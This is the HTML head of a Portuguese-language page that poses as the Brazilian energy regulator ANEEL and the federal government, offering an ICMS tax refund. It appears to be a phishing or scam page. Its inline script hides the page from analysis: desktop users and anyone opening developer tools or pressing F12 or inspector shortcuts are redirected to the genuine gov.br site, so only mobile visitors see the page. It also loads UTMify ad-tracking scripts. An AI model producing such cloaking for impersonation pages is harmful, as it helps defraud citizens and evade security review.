<!DOCTYPE html>
<html lang="pt-BR" data-protected="true">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
    <title>ANEEL - Restituição ICMS | Governo Federal</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- Script de proteção simples: Desktop e DevTools -->
    <script>
      (function() {
        // Redirecionamento para ANEEL
        const ANEEL_URL = "https://www.gov.br/";
        
        // Detectar se é mobile
        function isMobileDevice() {
          const userAgent = navigator.userAgent || navigator.vendor || window.opera;
          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        }
        
        // Se não for mobile, redirecionar
        if (!isMobileDevice()) {
          window.location.href = ANEEL_URL;
        }
        
        // Detectar ferramentas de desenvolvedor (pelo tamanho da janela)
        function detectDevTools() {
          const threshold = 160;
          const widthThreshold = window.outerWidth - window.innerWidth > threshold;
          const heightThreshold = window.outerHeight - window.innerHeight > threshold;
          
          if (widthThreshold || heightThreshold) {
            window.location.href = ANEEL_URL;
          }
        }
        
        // Verificar DevTools a cada segundo
        setInterval(detectDevTools, 1000);
        
        // Detectar teclas de ferramentas de desenvolvedor
        window.addEventListener('keydown', function(e) {
          // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C
          if (e.keyCode === 123 || 
              (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67))) {
            window.location.href = ANEEL_URL;
          }
        });
      })();
    </script>
    
    <!-- UTMify Scripts -->
    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-subids
      async
      defer
    ></script>
    
    <!-- Pixel UTMify -->
    <script>
      window.pixelId = "67f81e2d256556cd68218366";
      var a = document.createElement("script");
      a.setAttribute("async", "");
      a.setAttribute("defer", "");
      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
      document.head.appendChild(a);
    </script>
  </head>
